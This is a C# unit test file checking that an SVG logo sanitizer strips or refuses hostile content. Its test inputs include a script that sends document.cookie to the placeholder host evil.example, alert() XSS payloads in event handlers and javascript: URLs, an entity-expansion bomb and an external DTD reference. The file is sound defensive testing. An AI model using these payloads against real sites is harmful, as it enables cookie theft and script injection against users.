using ContentPilot.Infrastructure.Assets;
using Shouldly;

namespace ContentPilot.UnitTests.Assets;

/// <summary>
/// An SVG logo is XML that ends up inside the renderer's browser. These are the payloads
/// that would matter if it went in unexamined.
/// </summary>
public sealed class SvgSanitizerTests
{
    private const string Wrapper =
        """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">{0}</svg>""";

    private static string Wrap(string inner) => Wrapper.Replace("{0}", inner);

    private const string Rect = """<rect x="10" y="10" width="80" height="80" fill="#6C4CF1"/>""";

    [Fact]
    public void A_plain_logo_survives_intact()
    {
        var result = SvgSanitizer.Sanitize(Wrap(Rect));

        result.ShouldContain("rect");
        result.ShouldContain("#6C4CF1");
    }

    [Fact]
    public void Script_elements_are_removed()
    {
        var result = SvgSanitizer.Sanitize(Wrap(Rect + "<script>fetch('https://evil.example/'+document.cookie)</script>"));

        result.ShouldNotContain("script");
        result.ShouldNotContain("evil.example");
        result.ShouldContain("rect");
    }

    [Fact]
    public void Event_handler_attributes_are_removed()
    {
        var result = SvgSanitizer.Sanitize(
            Wrap("""<rect x="1" y="1" width="9" height="9" fill="#fff" onload="alert(1)" onclick="alert(2)"/>"""));

        result.ShouldNotContain("onload");
        result.ShouldNotContain("onclick");
    }

    [Fact]
    public void Foreign_objects_and_embedded_images_are_removed()
    {
        var result = SvgSanitizer.Sanitize(Wrap(
            Rect +
            """<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://evil.example"/></body></foreignObject>""" +
            """<image href="https://evil.example/pixel.png"/>"""));

        result.ShouldNotContain("foreignObject");
        result.ShouldNotContain("iframe");
        result.ShouldNotContain("image");
    }

    [Fact]
    public void External_references_inside_allowed_attributes_are_removed()
    {
        // A fill that resolves over the network is a tracking pixel with extra steps.
        var result = SvgSanitizer.Sanitize(
            Wrap("""<rect x="1" y="1" width="9" height="9" fill="url(https://evil.example/t.svg#g)"/>"""));

        result.ShouldNotContain("evil.example");
    }

    [Fact]
    public void Javascript_urls_are_removed()
    {
        var result = SvgSanitizer.Sanitize(
            Wrap("""<rect x="1" y="1" width="9" height="9" fill="#fff" style="background:url(javascript:alert(1))"/>"""));

        result.ShouldNotContain("javascript:");
    }

    [Fact]
    public void An_entity_declaration_is_refused_outright()
    {
        // Billion laughs and XXE both arrive this way, and no legitimate logo needs entities.
        var bomb =
            """<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]>""" +
            Wrap("""<text>&b;</text>""");

        Should.Throw<InvalidOperationException>(() => SvgSanitizer.Sanitize(bomb))
            .Message.ShouldContain("entity");
    }

    [Fact]
    public void An_external_dtd_is_refused_outright() =>
        Should.Throw<InvalidOperationException>(() => SvgSanitizer.Sanitize(
            """<!DOCTYPE svg SYSTEM "http://evil.example/x.dtd">""" + Wrap(Rect)));

    [Fact]
    public void Malformed_xml_is_refused_with_a_clear_reason() =>
        Should.Throw<InvalidOperationException>(() => SvgSanitizer.Sanitize("<svg><rect></svg>"))
            .Message.ShouldContain("well-formed");

    [Fact]
    public void A_document_that_is_not_svg_is_refused() =>
        Should.Throw<InvalidOperationException>(() => SvgSanitizer.Sanitize("<html><body>hello</body></html>"));

    [Fact]
    public void An_svg_with_nothing_drawable_left_is_refused()
    {
        // Everything it contained was stripped, so rasterising it would produce an empty
        // logo rather than an error the operator can understand.
        Should.Throw<InvalidOperationException>(() => SvgSanitizer.Sanitize(Wrap("<script>alert(1)</script>")))
            .Message.ShouldContain("drawable");
    }

    [Fact]
    public void Gradients_and_groups_are_allowed_because_real_logos_use_them()
    {
        var result = SvgSanitizer.Sanitize(Wrap(
            """<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs>""" +
            """<g transform="translate(5,5)"><path d="M0 0 L10 10" fill="url(#g)"/></g>"""));

        result.ShouldContain("linearGradient");
        result.ShouldContain("path");

        // A same-document reference is fine; only network references were the problem.
        result.ShouldContain("url(#g)");
    }
}
